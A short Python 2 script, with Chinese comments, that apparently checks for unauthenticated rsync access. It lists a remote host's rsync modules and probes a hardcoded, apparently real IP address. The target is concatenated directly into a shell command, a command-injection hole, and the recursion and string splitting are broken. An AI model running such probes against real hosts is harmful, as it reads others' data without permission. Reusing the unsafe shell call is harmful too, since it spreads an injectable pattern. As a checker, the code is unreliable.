#!/usr/bin/python
#-*- coding:utf-8 -*-

'''rsync未授权访问'''

import os
import commands

def __test_rsyncunauth(ip, data = ' '):
    '''
    验证是否存在rsync未授权访问漏洞
    :param url:
    :return:
    '''
    (status, resp) = commands.getstatusoutput('rsync -av --timeout=5 ' + ip + '::' + data)
    if status == 0: #表示获取# 到敏感信息
        resp_dic = resp.split(' \t\n')
        for item in resp_dic:
            if item != ' ':
                return True
            __test_rsyncunauth(ip, item[:item.find(' ')])

    return False

if __name__ == '__main__':
    print __test_rsyncunauth('112.124.12.124')
